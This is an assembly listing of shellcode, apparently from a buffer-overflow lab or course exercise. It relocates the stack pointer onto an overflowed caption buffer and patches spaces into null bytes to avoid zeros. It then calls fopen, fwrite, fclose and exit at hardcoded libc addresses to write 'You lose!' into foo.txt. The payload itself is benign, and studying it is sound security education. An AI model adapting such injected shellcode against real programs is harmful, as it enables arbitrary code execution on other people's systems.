
shellcode:
  xor %eax, %eax		//clear eax
  addl $0x42, %eax		//put 66 into eax
  addl $0x64, %eax		//add 100 to eax to get 166
  shl $2, %eax			//multiply eax by 4 to get 664
  subl %eax, %esp		//set esp to start of caption, 664 bytes from return

  movl %esp, %eax		//eax points to "foo.txt"
  addl $7, %eax			//eax points to end of "foo.txt"
  movb (%eax), %bl		//get value in eax
  subb $0x20, %bl		//change ' ' to '\0'
  movb %bl, (%eax)		//move value back in eax

  addl $2, %eax			//eax points to end of "a"
  movb (%eax), %bl		//get value in eax
  subb $0x20, %bl		//change ' ' to '\0'
  movb %bl, (%eax)		//move value back in eax

  movl %esp, %ebx		//store esp in ebx
  movl %ebx, %eax		//move ebx into eax
  addl $8, %eax			//add offset to "a"
  pushl %eax			//push "a" on stack
  movl %ebx, %eax		//move pointer to "foo.txt" into eax
  pushl %eax			//push "foo.txt" on stack
  movl $0xf7f4c0a0, %eax	//move fopen into eax
  call *%eax			//call fopen

  addl $8, %esp			//restore stack
  pushl %eax			//push fd on stack
  xor %eax, %eax		//clear eax
  addl $9, %eax			//put 9 into eax
  pushl %eax			//push count of 9 on stack
  xorl %eax, %eax		//clear eax
  addl $1, %eax			//move 1 (size of char) into eax
  pushl %eax			//push size of char on stack
  movl %ebx, %eax		//move ebx into eax
  addl $10, %eax		//add offset to "You lose!"
  pushl %eax			//push "You lose!" on stack
  movl $0xf7e87804, %eax	//move fwrite function into eax (+4 to avoid trailing zeros)
  subl $4, %eax			//sub eax by 4 to get actual func addr
  call *%eax			//call fwrite
  
  addl $12, %esp		//restore 12 bytes of esp, so fd is still on stack
  movl $0xf7f4c330, %eax	//move fclose function into eax
  call *%eax			//call fclose (don't want mem leak)

  movl $0xf7e53f30, %eax	//move exit into eax
  call *%eax			//call exit

  

  
  
